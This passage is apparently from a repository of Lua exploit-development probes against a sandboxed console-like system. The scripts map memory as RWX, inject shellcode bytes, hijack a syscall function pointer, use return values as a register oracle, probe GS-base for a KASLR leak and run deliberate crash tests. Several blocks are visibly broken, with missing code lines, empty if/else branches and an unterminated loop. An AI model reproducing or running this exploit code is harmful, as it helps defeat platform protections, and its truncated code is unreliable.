-- Execute (this will temporarily corrupt fn_addr, but we restore after)
safe_wq(fn_ptr, page + 0x500)
local ok_fn, ret_fn = pcall(function() return sc_getpid() end)
-- DO NOT restore fn_addr yet — the shellcode may have written to fn_ptr!

local fn_after = safe_rd(fn_ptr) or 0
print(string.format("fn_ptr low dword after: 0x%08X (expect 0x12345678 if write worked)", fn_after))

-- NOW restore fn_addr
safe_wq(fn_ptr, fn_orig)
local ok_restore = pcall(function() return to_num(sc_getpid()) end)
print(string.format("fn_addr restored, getpid ok=%s", tostring(ok_restore)))

if fn_after == 0x12345678 then
    print("*** SHELLCODE CAN WRITE TO FN_PTR ADDRESS! ***")
elseif fn_after ~= fn_before then
    print(string.format("*** VALUE CHANGED to 0x%08X (not expected) ***", fn_after))
else
    print("unchanged — shellcode cannot write to fn_ptr either")
end

--------------------------------------------------------------------
-- H) ALTERNATIVE: TRY ROP CHAIN RETURN VALUE AS OUTPUT
-- The ROP chain returns a value to Lua. In 44a, mov eax returned pid.
-- Maybe the ROP chain reads the return value from a MEMORY SLOT, not rax.
-- If so, we can find that slot and write to it from shellcode.
--------------------------------------------------------------------
print("")
print("=== H: RETURN VALUE INVESTIGATION ===")

-- Test: what value does a bare RET return?
-- If page+0x600 has just 0xC3 (ret), what does Lua see?
write_code(page, 0x600, {0xC3})
local ok_ret, rv_ret = exec_at(0x600)
print(string.format("bare ret: ok=%s ret=%d (0x%X)", tostring(ok_ret), rv_ret,
    rv_ret >= 0 and rv_ret or 0))

-- Test: xor eax,eax; ret — should return 0 if ROP uses rax
write_code(page, 0x610, {0x31, 0xC0, 0xC3})
local ok_xor, rv_xor = exec_at(0x610)
print(string.format("xor eax,eax; ret: ok=%s ret=%d", tostring(ok_xor), rv_xor))

-- Test: mov eax, 0xBEEF; ret — should return 0xBEEF if ROP uses rax
write_code(page, 0x620, {0xB8, 0xEF, 0xBE, 0x00, 0x00, 0xC3})
local ok_beef, rv_beef = exec_at(0x620)
print(string.format("mov eax,0xBEEF; ret: ok=%s ret=%d (0x%X)", tostring(ok_beef), rv_beef,
    rv_beef >= 0 and rv_beef or 0))

-- Test: mov eax, 0x41414141; ret — from 44a, returned pid
write_code(page, 0x630, {0xB8, 0x41, 0x41, 0x41, 0x41, 0xC3})
local ok_4141, rv_4141 = exec_at(0x630)
print(string.format("mov eax,0x41414141; ret: ok=%s ret=%d (0x%X)", tostring(ok_4141), rv_4141,
    rv_4141 >= 0 and rv_4141 or 0))

if rv_xor == 0 and rv_beef == 0xBEEF then
    print("*** ROP CHAIN USES RAX AS RETURN VALUE! ***")
    print("*** We can use return values as 1-value-at-a-time oracle ***")
elseif rv_xor == rv_beef and rv_beef == rv_4141 then
    print("return value is constant (ROP reads from memory slot, not rax)")
    print(string.format("constant return = %d (0x%X)", rv_ret, rv_ret))
else
    print("return values vary but don't match eax")
    print("ROP chain may modify rax after our code returns")
end

--------------------------------------------------------------------
-- I) IF RETURN VALUE WORKS: USE IT AS ORACLE
-- Read registers one at a time via return value
--------------------------------------------------------------------
print("")
print("=== I: REGISTER ORACLE (via return value) ===")

-- Read rdi low 32 bits: mov eax, edi; ret
write_code(page, 0x700, {0x89, 0xF8, 0xC3})  -- mov eax, edi; ret
local ok_rdi, rv_rdi = exec_at(0x700)
print(string.format("rdi low32: 0x%08X", rv_rdi >= 0 and rv_rdi or 0))

-- Read rsi low 32 bits: mov eax, esi; ret

local ok_rsi, rv_rsi = exec_at(0x710)
print(string.format("rsi low32: 0x%08X", rv_rsi >= 0 and rv_rsi or 0))

-- Read rdx low 32 bits: mov eax, edx; ret

local ok_rdx, rv_rdx = exec_at(0x720)
print(string.format("rdx low32: 0x%08X", rv_rdx >= 0 and rv_rdx or 0))

-- Read rcx low 32 bits: mov eax, ecx; ret
write_code(page, 0x730, {0x89, 0xC8, 0xC3})  -- mov eax, ecx; ret
local ok_rcx, rv_rcx = exec_at(0x730)
print(string.format("rcx low32: 0x%08X", rv_rcx >= 0 and rv_rcx or 0))

-- Read r8 low 32 bits: 44 89 C0 C3 (mov eax, r8d; ret)

print(string.format("r8  low32: 0x%08X", rv_r8 >= 0 and rv_r8 or 0))

-- Read r9 low 32 bits: 44 89 C8 C3 (mov eax, r9d; ret)

local ok_r9, rv_r9 = exec_at(0x750)
print(string.format("r9  low32: 0x%08X", rv_r9 >= 0 and rv_r9 or 0))

-- Read rsp low 32 bits: 89 E0 C3 (mov eax, esp; ret)

local ok_rsp, rv_rsp = exec_at(0x760)
print(string.format("rsp low32: 0x%08X", rv_rsp >= 0 and rv_rsp or 0))

-- Read rbp low 32 bits: 89 E8 C3 (mov eax, ebp; ret)

print(string.format("rbp low32: 0x%08X", rv_rbp >= 0 and rv_rbp or 0))

-- (save original rax through ebx before returning it)

--------------------------------------------------------------------
-- J) KASLR: RDGSBASE VIA RETURN VALUE
--------------------------------------------------------------------
print("")
print("=== J: RDGSBASE VIA RETURN VALUE ===")

-- RDGSBASE rax; ret  →  F3 0F AE C8 C3
write_code(page, 0x800, {0xF3, 0x0F, 0xAE, 0xC8, 0xC3})
local ok_gs, rv_gs = exec_at(0x800)

if ok_gs then

else

end

-- RDFSBASE rax; ret  →  F3 0F AE C0 C3
write_code(page, 0x820, {0xF3, 0x0F, 0xAE, 0xC0, 0xC3})
local ok_fs, rv_fs = exec_at(0x820)

-- K) CLEANUP
--------------------------------------------------------------------
print("")
print("=== K: CLEANUP ===")
safe_wq(fn_ptr, fn_orig)
local ok_final = pcall(function() return to_num(sc_getpid()) end)

print("")
```

## probes/phase10_untested_theories/45c_execution_reality_check.lua

```lua
-- CRASH_CLASS: HIGH (intentional crash tests: ud2, unmapped, null, chain corruption)
-- PROBE 45c: Execution Reality Check
--
-- 45b showed ALL return values = 128 (pid), ALL memory writes fail,
-- ALL register oracles return 128. xor eax,eax;ret returns 128, which
-- is IMPOSSIBLE if the code actually runs. Conclusion: fn_addr-redirected
-- code is NOT executing. The "W^X bypass" from 44a was a false positive.
--
-- This probe answers definitively what's happening:
--   B) Read the syscall stub to understand fn_addr's normal target
--   C) Sysctl with NOP fn_addr — does the chain do syscalls on its own?
--   D) Stub offset redirect — does moving fn_addr change behavior at all?
--   E-G) Crash tests: ud2, unmapped, null — does the chain CALL fn_addr?
--   H) ROP chain corruption — is the chain even used?
--   I-K) Chain dump + pipe string — full structural analysis
--
-- Tests ordered: non-destructive analysis first, crash tests last.

print("=== PROBE 45c: EXECUTION REALITY CHECK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_sysctl = make_syscall(202)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) SETUP
--------------------------------------------------------------------
print("")
print("=== A: SETUP ===")

local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then print("FATAL: mmap failed"); return end
print("code page: " .. qw_hex(page))

-- Fill with INT3
for i = 0, page_size/4 - 1 do safe_wd(page + i*4, 0xCCCCCCCC) end

-- Make RWX
pcall(function() sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7)) end)
print("mtypeprotect(RWX): done")

-- fn_addr
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: cannot parse fn_addr"); return end
local fn_ptr = uint64(fn_str)
local fn_orig = safe_rq(fn_ptr)
if not fn_orig then print("FATAL: cannot read fn_addr"); return end
print("fn_addr ptr: " .. fn_str)
print("fn_addr original: " .. qw_hex(fn_orig))
print("ropchain: " .. (rop_str or "unknown"))

local function write_code(base, offset, bytes)
    local p = {}
    for _, b in ipairs(bytes) do p[#p+1] = b end
    while #p % 4 ~= 0 do p[#p+1] = 0xCC end
    for i = 0, #p/4 - 1 do
        local dw = p[i*4+1] + p[i*4+2]*256 + p[i*4+3]*65536 + p[i*4+4]*16777216
        safe_wd(base + offset + i*4, dw)
    end
end

local function exec_at(offset)
    safe_wq(fn_ptr, page + offset)
    local ok, ret = pcall(function() return sc_getpid() end)
    safe_wq(fn_ptr, fn_orig)
    return ok, ok and to_num(ret) or -999
end

--------------------------------------------------------------------
-- B) SYSCALL STUB ANALYSIS (SAFE - no code reads, XO kills process)
-- Just identify which module fn_addr lives in via dynlib_get_info
--------------------------------------------------------------------
print("")
print("=== B: FN_ADDR MODULE IDENTIFICATION ===")
local fn_h, fn_l = get_hi_lo(fn_orig)
print(string.format("fn_addr value: %08X_%08X", fn_h, fn_l))
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
local found_module = "unknown"
for handle = 0, 40 do
    safe_wd(info_buf, 0x160)
    local ok = pcall(function() sc_info(uint64(handle), uint64(info_buf)) end)
    if ok then
        local t_lo = safe_rd(info_buf + 0x108)
        local t_hi = safe_rd(info_buf + 0x10C)
        local t_sz_lo = safe_rd(info_buf + 0x110)
        local t_sz_hi = safe_rd(info_buf + 0x114)
        if t_lo and t_hi then
            local mod_start_l = t_lo
            local mod_start_h = t_hi
            local mod_end_l = t_lo + (t_sz_lo or 0)
            local mod_end_h = t_hi + (t_sz_hi or 0)
            if fn_h == mod_start_h and fn_l >= mod_start_l and fn_l < mod_end_l then
                local name_bytes = {}
                for i = 0, 31 do
                    local b = safe_rd(info_buf + 0x18 + i)
                    if b and b > 0 and b < 128 then
                        name_bytes[#name_bytes+1] = string.char(b)
                    else
                        break
                    end
                end
                found_module = table.concat(name_bytes)
                local off = fn_l - mod_start_l
                print(string.format("  module[%d]: %s text=%08X_%08X+%08X", handle, found_module, mod_start_h, mod_start_l, t_sz_lo or 0))
                print(string.format("  fn_addr is at module+0x%X", off))
                break
            end
        end
    end
end
if found_module == "unknown" then
    print("  fn_addr does NOT match any loaded module text range")
end
print("  SKIPPING code read (XO kills past pcall)")

--------------------------------------------------------------------
-- C) SYSCTL WITH NOP FN_ADDR
-- If the chain does syscalls independently of fn_addr, sysctl will
-- still work even when fn_addr points to NOP+ret.
--------------------------------------------------------------------
print("")
print("=== C: SYSCTL WITH NOP FN_ADDR ===")

local mib = memory.alloc(16)
safe_wd(mib, 1)       -- CTL_KERN
safe_wd(mib + 4, 14)  -- KERN_PROC
safe_wd(mib + 8, 1)   -- KERN_PROC_PID
safe_wd(mib + 12, pid)

local sysctl_out = memory.alloc(0x800)
for i = 0, 511 do safe_wd(sysctl_out + i*4, 0) end
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

-- Write NOP+ret to code page
write_code(page, 0x100, {0x90, 0x90, 0x90, 0x90, 0xC3})

-- Redirect fn_addr to NOP+ret, then call sysctl
safe_wq(fn_ptr, page + 0x100)
local ok_sc, rv_sc = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(sysctl_out),
        uint64(oldlenp), uint64(0), uint64(0))
end)
safe_wq(fn_ptr, fn_orig)

local sc_rv = ok_sc and to_num(rv_sc) or -999
local after_out = safe_rd(sysctl_out) or 0
local after_len = safe_rd(oldlenp) or 0
print(string.format("sysctl(NOP fn_addr): ok=%s ret=%d", tostring(ok_sc), sc_rv))
print(string.format("  output[0]=0x%08X, len=%d", after_out, after_len))

if after_out ~= 0 or after_len ~= 0x800 then
    print("*** SYSCTL DATA RETURNED despite fn_addr=NOP! ***")
    print("*** Chain does syscall INDEPENDENTLY of fn_addr ***")
else
    print("no data — sysctl did NOT run")
    print("(fn_addr may be the syscall entry, or chain broken)")
end

-- Control: do sysctl with ORIGINAL fn_addr to verify it works at all
for i = 0, 511 do safe_wd(sysctl_out + i*4, 0) end
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)
local ok_ctrl, rv_ctrl = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(sysctl_out),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local ctrl_rv = ok_ctrl and to_num(rv_ctrl) or -999
local ctrl_out = safe_rd(sysctl_out) or 0
local ctrl_len = safe_rd(oldlenp) or 0
print(string.format("sysctl(orig fn_addr): ok=%s ret=%d", tostring(ok_ctrl), ctrl_rv))
print(string.format("  output[0]=0x%08X, len=%d", ctrl_out, ctrl_len))

--------------------------------------------------------------------
-- D) STUB OFFSET REDIRECT
-- Redirect fn_addr to fn_orig+0 through +15. If the chain calls
-- fn_addr, misaligned offsets should change behavior or crash.
--------------------------------------------------------------------
print("")
print("=== D: STUB OFFSET REDIRECT ===")
for offset = 0, 15 do
    safe_wq(fn_ptr, fn_orig + offset)
    local ok, ret = pcall(function() return sc_getpid() end)
    safe_wq(fn_ptr, fn_orig)
    local rv = ok and to_num(ret) or -999
    local marker = ""
    if rv ~= pid then marker = " ← DIFFERENT!" end
    if not ok then marker = " ← CRASHED!" end
    print(string.format("  fn_addr+%02d: ok=%s ret=%d%s", offset, tostring(ok), rv, marker))
    if not ok then

        safe_wq(fn_ptr, fn_orig)
        local ok2 = pcall(function() return sc_getpid() end)
        print(string.format("  recovery: ok=%s", tostring(ok2)))
        break
    end

local ok_final = pcall(function() return to_num(sc_getpid()) end)
```
